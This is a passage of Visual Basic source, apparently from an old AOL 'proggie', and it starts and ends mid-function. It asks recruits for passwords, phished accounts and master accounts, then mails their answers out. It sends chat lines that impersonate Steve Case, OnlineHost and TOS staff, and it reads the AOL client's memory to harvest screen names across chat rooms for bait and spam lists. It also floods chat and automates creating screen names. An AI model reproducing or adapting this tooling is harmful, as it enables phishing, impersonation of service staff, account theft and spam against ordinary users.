sPrompt = "PWS =" 'Set the prompt...
X = sPrompt
sPrompt = X
a48$ = "pws - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Spam =" 'Set the prompt...
X = sPrompt
sPrompt = X
a49$ = "spam - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Server =" 'Set the prompt...
X = sPrompt
sPrompt = X
a50$ = "server - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "OH =" 'Set the prompt...
X = sPrompt
sPrompt = X
a51$ = "oh - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "9 MM =" 'Set the prompt...
X = sPrompt
sPrompt = X
a52$ = "9mm - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "VP =" 'Set the prompt...
X = sPrompt
sPrompt = X
a53$ = "vp - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Prez =" 'Set the prompt...
X = sPrompt
sPrompt = X
a54$ = "prez - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Acc =" 'Set the prompt...
X = sPrompt
sPrompt = X
a55$ = "acc - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Mailer demon =" 'Set the prompt...
X = sPrompt
sPrompt = X
a56$ = "mailer demon - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "CC =" 'Set the prompt...
X = sPrompt
sPrompt = X
a57$ = "cc - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Sub Account =" 'Set the prompt...
X = sPrompt
sPrompt = X
a58$ = "sub acc - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Master account =" 'Set the prompt...
X = sPrompt
sPrompt = X
a59$ = "mazter acc - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Catwatch =" 'Set the prompt...
X = sPrompt
sPrompt = X
a60$ = "catwatch - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Guide =" 'Set the prompt...
X = sPrompt
sPrompt = X
a61$ = "guide - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
MsgBox "Now im gonna azk you some simple queztionz about your self", 64, "step3"
sPrompt = "Have u eva been in a group before?" 'Set the prompt...
X = sPrompt
sPrompt = X
a62$ = "b4 group? - " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "How old are you?" 'Set the prompt...
X = sPrompt
sPrompt = X
a63$ = "age = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Male/Female" 'Set the prompt...
X = sPrompt
sPrompt = X
a64$ = "sex  = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "iz your aol account yourz?" 'Set the prompt...
X = sPrompt
sPrompt = X
a65$ = "iz aol acc yourz = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "are you able to create a screen name?" 'Set the prompt...
X = sPrompt
sPrompt = X
a66$ = "able to create a screen name = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "how much time do you spend on aol daily?" 'Set the prompt...
X = sPrompt
sPrompt = X
a67$ = "Time on AOL Daily = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "what all can you do?" 'Set the prompt...
X = sPrompt
sPrompt = X
a68$ = "What All Can u do = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "what possition are u applying for?" 'Set the prompt...
X = sPrompt
sPrompt = X
a69$ = "Posstion Desired = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "what version(z) of aol do you uze" 'Set the prompt...
X = sPrompt
sPrompt = X
a70$ = "AOL Versionz Used = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "How many <><'z can you get weekly?" 'Set the prompt...
X = sPrompt
sPrompt = X
a71$ = "# of <>< weekly = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "how many roomz can u advertize in in a day?" 'Set the prompt...
X = sPrompt
sPrompt = X
a72$ = "# ro0mz adv daily = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "how did you hear about thiz group?" 'Set the prompt...
X = sPrompt
sPrompt = X
a73$ = "How hear bout diz group = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
'''''''''''
sPrompt = "Why do you wish to join are group?" 'Set the prompt...
X = sPrompt
sPrompt = X
a74$ = "Why do u wish to join da group = " + InputBox$(sPrompt, IB_TITLE, "??", iXPos, iYPos)   'Display box, get input
resend:
If IsUserOnline Then
MsgBox "Now you are done filling out all required Fieldz, the application will now be sent!", 64, "Sending Ouwop the APP"
k$ = Chr(13)
a$ = a$ & k$ & a1$ & k$ & a2$ & k$ & a3$ & k$ & a4$ & k$ & a5$ & k$ & a6$ & k$ & a7$ & k$ & a8$ & k$ & a9$ & k$ & a10$ & k$ & a11$ & k$ & a12$ & k$ & a13$ & k$ & a14$ & k$ & a15$ & k$ & a16$ & k$ & a17$ & k$ & a18$ & k$ & a19$ & k$ & a20$ & k$ & a21$ & k$ & a22$ & k$ & a23$ & k$ & a24$ & k$ & a25$ & k$ & a26$ & k$ & a27$ & k$ & a28$ & k$ & a29$ & k$ & a30$ & k$ & a31$ & k$ & a32$ & k$ & a33$ & k$ & a34$ & k$ & a35$ & k$ & a36$ & k$ & a37$ & k$ & a38$ & k$ & a39$ & k$ & a40$ & k$ & a41$ & k$ & a42$ & k$ & a43$ & k$ & a44$ & k$ & a45$ & k$ & a46$ & k$ & a47$ & k$ & a48$ & k$ & a49$ & k$ & a50$ & k$ & a51$ & k$ & a52$ & k$ & a53$ & k$ & a54$ & k$ & a55$ & k$ & a56$ & k$ & a57$ & k$ & a58$ & k$ & a59$ & k$ & a60$ & k$ & a61$ & k$ & a62$ & k$ & a63$ & k$ & a64$ & k$ & a65$ & k$ & a66$ & k$ & a67$ & k$ & a68$ & k$ & a69$ & k$ & a70$ & k$ & a71$ & k$ & a72$ & k$ & a73$ & k$ & a74$ & k$ & a75$
a$ = a$ & k$ & k$ & Date$ + "   -   " + time$
Call MazTa_SendMail(yurEmail$, a1$ + " [" + getuser + "]", a$)
Else
MsgBox "You are Not Signed On AOL version 2, 4, or 5" + Chr(10) + "in 1 minute thiz will try to send again, in that time, pleaze Sign On to AOL", 64, "Cant Find AOL"
TimeOut (60)
GoTo resend
End If

End Sub

Function izClone()
'ouwop
'checkz to see if uzer iz cloneing
If AOL_VerzioN = 4 Then
Minimize_AOL
Maximize_AOL
If AOL_VerzioN = 2 Then izClone = 1 Else izClone = 0
Else
Minimize_AOL
Maximize_AOL
If AOL_VerzioN = 4 Then izClone = 1 Else izClone = 0
End If
End Function

Sub Manip_Steve(What As String)
'ouwop
sendchat "</h2><b><font color=#0000ff><FONT PTSIZE=8>SteveCase:</b><font color=#g>                    <FONT PTSIZE=10>" + What$ + "<font color=#fffffe><<a"
sendchat "."
End Sub
Sub Manip_HozT(What As String)
'ouwop
sendchat "</h2><b><font color=#0000ff><FONT PTSIZE=8>OnlineHost:</b><font color=#g>                   <FONT PTSIZE=10>" + What$ + "<font color=#fffffe><<a"
sendchat "."
End Sub
Sub Manip_TOS(What As String)
'ouwop
sendchat "</h2><b><font color=#0000ff><FONT PTSIZE=8>TOSGeneral:</b><font color=#g>                   <FONT PTSIZE=10>" + What$ + "<font color=#fffffe><<a"
sendchat "."
End Sub
Sub Cchat_PiC(Who As String, frm As Form)
'ouwop
d$ = INI_GeT("settingz", "pic", App.Path + "\uzer.ini")
If d$ = "" Then
MsgBox "You Have No Picture Setup to Send, Opening the Picture Picker Now...", vbCritical, "Err0r!"
frm.Show
Else
Call SendMail_attacheD(d$, Who$, ASCII_Random + "MazTa Proggz PIC Sender", "< a href=www.geocities.com\ouwop>Get MazTa Prog HERE!</a>")
End If
End Sub


 Function CreateName40(sName As String, sPassword As String)
Dim hMain&, hIcon&
Dim hModal&, hText&
Dim hMsgbox&
MDI = AolMdi
hMain = FindWindowEx(MDI, 0, "AOL Child", "AOL Screen Names")
hIcon = FindWindowEx(hMain, 0, "_AOL_Icon", vbNullString)
hIcon = FindWindowEx(hMain, hIcon, "_AOL_Icon", vbNullString)
hModal& = FindWindow("_AOL_Modal", vbNullString)
hText& = FindWindowEx(hModal&, 0&, "_AOL_Edit", vbNullString)
hIcon = FindWindowEx(hModal, 0&, "_AOL_Icon", vbNullString)
If hMain <> 0 And hModal <> 0 Then
 ElseIf hMain <> 0 And hModal = 0 Then
    Call pause(1)
    cLickiCoN (hIcon)
    Do
        DoEvents
        hMain = FindWindowEx(MDI, 0, "AOL Child", "Create A Screen Name")
        hIcon = FindWindowEx(hMain, 0, "_AOL_Icon", vbNullString)
    Loop Until hIcon <> 0
    Call pause(1)
    cLickiCoN (hIcon)
    Do
        DoEvents
        hModal& = FindWindow("_AOL_Modal", vbNullString)
        hText& = FindWindowEx(hModal&, 0&, "_AOL_Edit", vbNullString)
    Loop Until hText <> 0
ElseIf hMain = 0 And hModal = 0 Then
    Call XAOL4_Keyword("names")
    Do
        DoEvents
        hMain = FindWindowEx(MDI, 0, "AOL Child", "AOL Screen Names")
        hIcon = FindWindowEx(hMain, 0, "_AOL_Icon", vbNullString)
        hIcon = FindWindowEx(hMain, hIcon, "_AOL_Icon", vbNullString)
    Loop Until hIcon <> 0
    Call pause(1)
    cLickiCoN (hIcon)
    Do
        DoEvents
        hMain = FindWindowEx(MDI, 0, "AOL Child", "Create A Screen Name")
        hIcon = FindWindowEx(hMain, 0, "_AOL_Icon", vbNullString)
    Loop Until hIcon <> 0
    Call pause(1)
    cLickiCoN (hIcon)
    Do
        DoEvents
        hModal& = FindWindow("_AOL_Modal", vbNullString)
        hText& = FindWindowEx(hModal&, 0&, "_AOL_Edit", vbNullString)
    Loop Until hText <> 0
End If
    
hModal& = FindWindow("_AOL_Modal", vbNullString)
hText& = FindWindowEx(hModal&, 0&, "_AOL_Edit", vbNullString)
hIcon = FindWindowEx(hModal, 0&, "_AOL_Icon", vbNullString)
Call SetText(hText, sName)
Call pause(1)
cLickiCoN (hIcon)

Do
    DoEvents
    hMsgbox = FindWindow("#32770", "America Online")
Loop Until hMsgbox <> 0 Or CreateNamePW40 <> 0&
If hMsgbox <> 0 Then
    waitforOK
    CreateName40 = False
    Exit Function
ElseIf CreateNamePW40 <> 0& Then
    hText = FindWindowEx(CreateNamePW40&, 0, "_AOL_Edit", vbNullString)
    hIcon = FindWindowEx(CreateNamePW40&, 0, "_AOL_Icon", vbNullString)
    Call SetText(hText, sPassword$)
        hText = NextOfClass(hText)
    Call SetText(hText, sPassword$)
    TimeOut (0.6)
    cLickiCoN (hIcon)
    TimeOut (0.5)
    CreateName40 = True
ElseIf hMsgbox = 0 And CreateNamePW40 = 0 Then
    Do
        DoEvents
        hModal& = FindWindow("_AOL_Modal", vbNullString)
        hText& = FindWindowEx(hModal&, 0&, "_AOL_Edit", vbNullString)
        hIcon = FindWindowEx(hModal, 0&, "_AOL_Icon", vbNullString)
    Loop Until hText <> 0 And hIcon <> 0
    CreateName40 = False
    Exit Function
End If
End Function
Function CreateNamePW40() As Long
Dim hMain&
Dim hText&, hRICH&, hStatic&

hMain = FindWindow("_AOL_Modal", vbNullString)
hStatic = FindWindowEx(hMain, 0, "_AOL_Static", vbNullString)
hRICH = FindWindowEx(hMain, 0, "RICHCNTL", vbNullString)
hText = FindWindowEx(hMain, 0, "_AOL_Edit", vbNullString)

If hStatic <> 0 And hRICH <> 0 And hText <> 0 And NextOfClass(hText) <> 0 Then
    CreateNamePW40 = hMain
Else
    CreateNamePW40 = 0
End If

End Function


Sub aolautosncollect(thelist As ListBox, num, Text, label5 As Label)
    'idea by izekial
    'i edited it for a stop button n a txt box
    '[ouwop]
    Dim lngaol As Long, lngmdi As Long, lngtoolbar As Long, lngicon As Long, lngmenu As Long
    Dim cursorpos As POINTAPI, lngchild As Long, lnglist1 As Long, lnglist As Long
    Dim lngicon1 As Long, lngicon2 As Long, lngicon3 As Long, lngicon4 As Long, lngicon5 As Long
    Dim lngicon6 As Long, lngicon7 As Long, lngicon8 As Long, lngchatting As Long, lngcounter As Long
    Let lngaol& = FindWindow("AOL Frame25", vbNullString)
    Let lngmdi& = FindWindowEx(lngaol&, 0&, "MDIClient", vbNullString)
    Let lngtoolbar& = FindWindowEx(lngaol&, 0&, "AOL Toolbar", vbNullString)
    Let lngtoolbar& = FindWindowEx(lngtoolbar&, 0&, "_AOL_Toolbar", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, 0&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Let lngicon& = FindWindowEx(lngtoolbar&, lngicon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(cursorpos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(lngicon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(lngicon&, WM_LBUTTONUP, 0&, 0&)
    Do: DoEvents
        Let lngmenu& = FindWindow("#32768", vbNullString)
        If label5.caption = "a" Then GoTo byez
    Loop Until IsWindowVisible(lngmenu&) = 1&
    pause 0.2
    Call PostMessage(lngmenu&, WM_KEYDOWN, vbKeyF, 0&)
    Call PostMessage(lngmenu&, WM_KEYUP, vbKeyF, 0&)
    Call PostMessage(lngmenu&, WM_KEYDOWN, vbKeyF, 0&)
    Call PostMessage(lngmenu&, WM_KEYUP, vbKeyF, 0&)
   
    Do: DoEvents
        If label5.caption = "aa" Then GoTo byez
        Let lngchild& = FindWindowEx(lngmdi&, 0&, "AOL Child", "Find a Chat")
        Let lnglist1& = FindWindowEx(lngchild&, 0&, "_AOL_Listbox", vbNullString)
        Let lnglist& = FindWindowEx(lngchild&, lnglist&, "_AOL_Listbox", vbNullString)
        Let lngicon1& = FindWindowEx(lngchild&, 0&, "_AOL_Icon", vbNullString)
        Let lngicon2& = FindWindowEx(lngchild&, lngicon1&, "_AOL_Icon", vbNullString)
        Let lngicon3& = FindWindowEx(lngchild&, lngicon2&, "_AOL_Icon", vbNullString)
        Let lngicon4& = FindWindowEx(lngchild&, lngicon3&, "_AOL_Icon", vbNullString)
        Let lngicon5& = FindWindowEx(lngchild&, lngicon4&, "_AOL_Icon", vbNullString)
        Let lngicon6& = FindWindowEx(lngchild&, lngicon5&, "_AOL_Icon", vbNullString)
        Let lngicon7& = FindWindowEx(lngchild&, lngicon6&, "_AOL_Icon", vbNullString)
        Let lngicon8& = FindWindowEx(lngchild&, lngicon7&, "_AOL_Icon", vbNullString)
        Let lngicon& = FindWindowEx(lngchild&, lngicon8&, "_AOL_Icon", vbNullString)
TimeOut (1.5)
    Loop Until lngchild& <> 0& And lnglist1& <> 0& And lnglist& <> 0& And lnglist1& <> lnglist& And lngicon& <> 0& And lngicon1& <> 0& And lngicon2& <> 0& And lngicon3& <> 0& And lngicon4& <> 0& And lngicon5& <> 0& And lngicon6& <> 0& And lngicon7& <> 0& And lngicon8& <> 0& And _
    lngicon1& <> lngicon2& And lngicon2& <> lngicon3& And lngicon3& <> lngicon4& And lngicon4& <> lngicon5& And lngicon5& <> lngicon6& And lngicon6& <> lngicon7& And lngicon7& <> lngicon8& And lngicon8& <> lngicon&
    Call waitforlisttoload(lnglist&)
    Do: DoEvents
        If label5.caption = "aa" Then GoTo byez
        Call clicklistindex(lnglist&, lngcounter&)
            cLickiCoN (lngicon&)
        Let lngcounter& = lngcounter& + 1&
        Do: DoEvents
            If label5.caption = "aa" Then GoTo byez
            Let lngchatting& = FindWindowEx(lngmdi&, 0&, "AOL Child", "Who's Chatting")
        If thelist.listcount > num Then GoTo byez
            Let lnglist1& = FindWindowEx(lngchatting&, 0&, "_AOL_Listbox", vbNullString)
            Loop Until lngchatting& <> 0& And lnglist1& <> 0&
        Call waitforlisttoload(lnglist1&)
        If thelist.listcount > num Then GoTo byez
        Call addlisttocontrol(lnglist1&, thelist)
        Call PostMessage(lngchatting&, WM_CLOSE, 0&, 0&)
        TimeOut 1
        If label5.caption = "aa" Then GoTo byez
        TimeOut 1
        If label5.caption = "aa" Then GoTo byez
                TimeOut 1
        If label5.caption = "aa" Then GoTo byez
                TimeOut 1
        If label5.caption = "aa" Then GoTo byez
                TimeOut 1
        If label5.caption = "aa" Then GoTo byez
                TimeOut 1
        If label5.caption = "aa" Then GoTo byez
        If thelist.listcount > num Then GoTo byez
        Loop Until thelist.listcount > num
    Call SetCursorPos(cursorpos.X, cursorpos.Y)
byez:
End Sub

Public Sub clicklistindex(lnglist As Long, lngindex As Long)
   'izekial
   'diz aint nuttin hard but still why write it if itz there
   'ouwop
    Call SendMessage(lnglist&, LB_SETCURSEL, CLng(lngindex&), 0&)
End Sub

Sub Kill_Childz()
'ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
wel% = FindChildByTitle(MDI%, "Welcome, " + getuser + "!")
Bud% = FindChildByTitle(MDI%, "Buddy List Window")
Bud2% = FindChildByTitle(MDI%, "Buddies")
cha% = FindChildByTitle(MDI%, "Channels")
sea% = FindChildByTitle(MDI%, "AOL Search Preview")
sea2% = FindChildByTitle(MDI%, "AOL Search")
wel2% = FindChildByTitle(MDI%, "Main Menu")
bud3% = FindChildByTitle(MDI%, "Ouwop Online")
bud4% = FindChildByTitle(MDI%, "AOL member Benefits")
TimeOut (0.2)
Call AOL4_KillWin(wel%)
Call AOL4_KillWin(Bud%)
Call AOL4_KillWin(cha%)
Call AOL4_KillWin(sea%)
Call AOL4_KillWin(Bud2%)
Call AOL4_KillWin(sea2%)
Call AOL4_KillWin(wel2%)
Call AOL4_KillWin(bud3%)
Call AOL4_KillWin(bud4%)
TimeOut (0.3)
If XAOL4_GetCurrentRoomName = "AOL Hotline" Then Call AOL4_KillWin(FindRoom)
If XAOL4_GetCurrentRoomName = "AOL Member Benefits" Then Call AOL4_KillWin(FindRoom)


End Sub

Sub maximiZe(Parent)
'ouwop
Max% = FindWindow(Parent, vbNullString)
mi = ShowWindow(Max%, SW_MAXIMIZE)
End Sub

Sub OH_Design2()
'ouwop
a$ = ".…… ……………… …… ………………… ……."
b$ = ".…… …………… ………… ……………… ……."
c$ = ".…… ………… ……………… …………… ……."
d$ = ".…… ……… …………………… ………… ……."
e$ = ".…… …………… …………… …………… ……."
f$ = ".…… ……………… ……… ……………… ……."
g$ = ".…… ………………… … ………………… ……."
h$ = ".…… …………………… …………………… ……."
i$ = ".…… ………………… … ………………… ……."
J$ = ".…… ……………… ……… ……………… ……."
k$ = ".…… …………… …………… …………… ……."
l$ = ".…… ………… ………………… ………… ……."
m$ = ".…… ……… ……………………… ……… ……."
n$ = ".…… ………… ………………… ………… ……."
o$ = ".…… …………… …………… …………… ……."
p$ = ".…… ……………… ……… ……………… ……."
dizdick$ = "1"
Do
DoEvents:
TimeOut (0.000000001)
SendchAt3 (a$)
SendchAt3 (b$)
SendchAt3 (c$)
SendchAt3 (d$)
SendchAt3 (e$)
SendchAt3 (f$)
SendchAt3 (g$)
SendchAt3 (h$)
SendchAt3 (i$)
SendchAt3 (J$)
SendchAt3 (k$)
SendchAt3 (l$)
SendchAt3 (m$)
SendchAt3 (n$)
SendchAt3 (o$)
SendchAt3 (p$)
dizdick$ = dizdick$ + 1
Loop Until dizdick$ = "5"
End Sub

Function Ouwop_RN()
'ouwop
If izRoomPrivate = True Then Ouwop_RN = XAOL4_GetCurrentRoomName: Exit Function
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("town")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "town square - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("arts")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "Arts and entertainment - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("friends")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "friends - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("news")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "news, sports & finance - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("places")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "places - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("romance")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "romance - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("special")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "special interests - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("uk")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "uk - ", "")
If InStr(LCase(XAOL4_GetCurrentRoomName), LCase("canada")) Then Ouwop_RN = RePlacestRing(LCase(XAOL4_GetCurrentRoomName), "canada", "")
End Function

Sub SendchAt3(chat)
'ouwop
'for macroz
'uze thiz like....
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'sendchat3"a"
'you dont need to call TIMEOUT wit diz sub
sendchat (chat)
TimeOut (0.55)
End Sub

Public Sub waitforlisttoload(lnglist As Long)
    Dim lngcount As Long
    Do: DoEvents
        Let lngcount& = SendMessage(lnglist&, LB_GETCOUNT, 0&, 0&): Call pause(2&)
        If lngcount& = SendMessage(lnglist&, LB_GETCOUNT, 0&, 0&) Then Exit Do
    Loop
End Sub

Public Function ErrorName(name As Long) As String
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim NameCount As Long, TempString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
    If ErrorWindow& = 0& Then Exit Function
    ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
    ErrorString$ = gettext(ErrorTextWindow&)
    NameCount& = LineCount(ErrorString$) - 2
    If NameCount& < name& Then Exit Function
    TempString$ = LineFromString(ErrorString$, name& + 2)
    TempString$ = Left(TempString$, InStr(TempString$, "-") - 2)
    ErrorName$ = TempString$
End Function
Public Function ErrorNameCount() As Long
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim NameCount As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
    If ErrorWindow& = 0& Then Exit Function
    ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
    ErrorString$ = gettext(ErrorTextWindow&)
    NameCount& = LineCount(ErrorString$) - 2
    ErrorNameCount& = NameCount&
End Function

Function WallPaper(file$)
    Dim FileName As String
    Dim X As Long
    FileName = file$
X = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, FileName, _
        SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)

End Function

Public Sub FileSetHidden(TheFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(TheFile$)
    If SafeFile$ <> "" Then
        SetAttr TheFile$, vbHidden
    End If
End Sub
Public Sub addlisttocontrol(rlist As Long, thecontrol As Control)
    Dim cProcess As Long, itmHold As Long, screenname As String
    Dim psnHold As Long, rBytes As Long, Index As Long, room As Long
    Dim sThread As Long, mThread As Long, strtext As String
    If rlist& = 0& Then Exit Sub
    Let sThread& = GetWindowThreadProcessId(rlist&, cProcess&)
    Let mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For Index& = 0& To SendMessage(rlist&, LB_GETCOUNT, 0&, 0&) - 1&
            Let screenname$ = String$(4&, vbNullChar)
            Let itmHold& = SendMessage(rlist&, LB_GETITEMDATA, ByVal CLng(Index&), ByVal 0&)
            Let itmHold& = itmHold& + 24&
            Call ReadProcessMemory(mThread&, itmHold&, screenname$, 4&, rBytes&)
            Call CopyMemory(psnHold&, ByVal screenname$, 4&)
            Let psnHold& = psnHold& + 6&
            Let screenname$ = String$(16&, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, screenname$, Len(screenname$), rBytes&)
            thecontrol.AddItem LCase(RemoveSpace(screenname$))
        Next Index&
        Call CloseHandle(mThread&)
    End If
End Sub


Public Sub aol4_BaiT_AddNamEz(rlist As Long, thecontrol As Control)
'werrper -=P
    Dim cProcess As Long, itmHold As Long, screenname As String
    Dim psnHold As Long, rBytes As Long, Index As Long, room As Long
    Dim sThread As Long, mThread As Long, strtext As String
    If rlist& = 0& Then Exit Sub
     sThread& = GetWindowThreadProcessId(rlist&, cProcess&)
     mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For Index& = 0& To SendMessage(rlist&, LB_GETCOUNT, 0&, 0&) - 1&
             screenname$ = String$(4&, vbNullChar)
             itmHold& = SendMessage(rlist&, LB_GETITEMDATA, ByVal CLng(Index&), ByVal 0&)
             itmHold& = itmHold& + 24&
            Call ReadProcessMemory(mThread&, itmHold&, screenname$, 4&, rBytes&)
            Call CopyMemory(psnHold&, ByVal screenname$, 4&)
             psnHold& = psnHold& + 7&
             screenname$ = String$(16&, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, screenname$, Len(screenname$), rBytes&)
screenname$ = RemoveSpace(screenname$)
chatTrim$ = Left$(screenname$, 10)
Text = screenname$
ChatTrimNum = Len(sn$)
chatTrim$ = Mid$(Text, ChatTrimNum + 1, Len(Text))
pw$ = baiT_(chatTrim$)
thecontrol.AddItem LCase(RemoveSpace(pw$))
        Next Index&
        Call CloseHandle(mThread&)
End If
End Sub



Public Function FindErrorWindow() As Long
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", "Error")
   If AOLChild& <> 0& Then
     FindErrorWindow& = AOLChild&
     Exit Function
    Else
      AOLChild& = FindWindowEx(AolMdi, AOLChild&, "AOL Child", "Error")
      FindErrorWindow& = AOLChild&
      Exit Function
   End If
End Function

Public Sub AutoListerLobbyChat(ListBox As Control, limit As String, Text As TextBox, lbl As Label)
'same wit diz
    Dim Process As Long, ListHoldItem As Long, name As String
    Dim ListHoldName As Long, BytesRead As Long, ListHandle As Long
    Dim ProcessThread As Long, SearchIndex As Long, ChatRoom As Long
    Dim Current As Long
    If FindRoom& <> 0& Then Call AOL4_KillWin(FindRoom&)
        Do: DoEvents
            Call PopUpIcon(9, "C")
            Do: DoEvents
                ChatRoom& = FindRoom&
            Loop Until ChatRoom& <> 0&
            DoEvents
            TimeOut 1.3
            ListHandle& = FindWindowEx(FindRoom&, 0&, "_AOL_Listbox", vbNullString)
            Call GetWindowThreadProcessId(ListHandle&, Process&)
            ProcessThread& = OpenProcess(Op_Flags, False, Process&)
            If ProcessThread& Then
           If lbl.caption = "a" Then Exit Sub
               Text.Text = Text.Text - listcount(ListHandle&)
                For SearchIndex& = 0 To listcount(ListHandle&) - 1
                              If lbl.caption = "a" Then Exit Sub
                    name$ = String(4, vbNullChar)
                    ListHoldItem& = SendMessage(ListHandle&, LB_GETITEMDATA, ByVal CLng(SearchIndex&), 0&)
                    ListHoldItem& = ListHoldItem& + 24
                    Call ReadProcessMemory(ProcessThread&, ListHoldItem&, name$, 4, BytesRead&)
                    Call RtlMoveMemory(ListHoldItem&, ByVal name$, 4)
                    ListHoldItem& = ListHoldItem& + 6
                    name$ = String(16, vbNullChar)
